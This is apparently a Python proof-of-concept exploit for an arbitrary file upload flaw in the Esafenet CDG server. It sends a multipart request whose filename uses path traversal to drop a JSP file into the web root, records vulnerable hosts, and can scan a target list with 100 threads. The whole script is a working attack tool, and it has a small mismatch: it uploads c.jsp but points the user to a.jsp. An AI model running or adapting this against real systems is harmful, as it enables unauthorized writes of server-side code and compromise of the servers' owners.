#-*- coding: utf-8 -*-
import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


headers = {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
           "Accept-Encoding": "gzip, deflate",
           "Accept-Language": "zh-CN,zh;q=0.9",
           "Sec-Fetch-Dest": "document",
           "Sec-Fetch-Mode": "navigate",
           "Sec-Fetch-Site": "none",
           "Sec-Fetch-User": "?1",
           "Connection": "close",
           "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ8SZbo7ysFaaPrsP"}
data = "------WebKitFormBoundaryJ8SZbo7ysFaaPrsP\r\nContent-Disposition: form-data; name=\"fileshare\"; filename=\"/..\\\\..\\\\..\\\\..\\\\webapps\\\\ROOT\\\\c.jsp\"\r\n\r\n123\r\n------WebKitFormBoundaryJ8SZbo7ysFaaPrsP--\r\n"
def poc(target):
    url = "http://"+target+"/CDGServer3/fileType/importFileType.do?flag=syn_user_policy"
    try:
        res = requests.post(url, headers=headers, data=data, timeout=5, verify=False).text
        if '"result":"xmlFail","msg":"操作失败"' in res or 'already exists and could not be deleted' in res:
            print(f"[+] {target} is vulable"+"\n请点击链接查看(若为123则存在漏洞):"+target+"/a.jsp")
            with open("request.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
            return True
        else:
            print(f"[-] {target} is not vulable")
            return False
    except:
        print(f"[*] {target} error")
        return False

def main():
    parser = argparse.ArgumentParser(description='Esafenet 任意文件上传 POC')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    # parser.add_argument("-u", "--url.txt", dest="url.txt", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    print(args)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()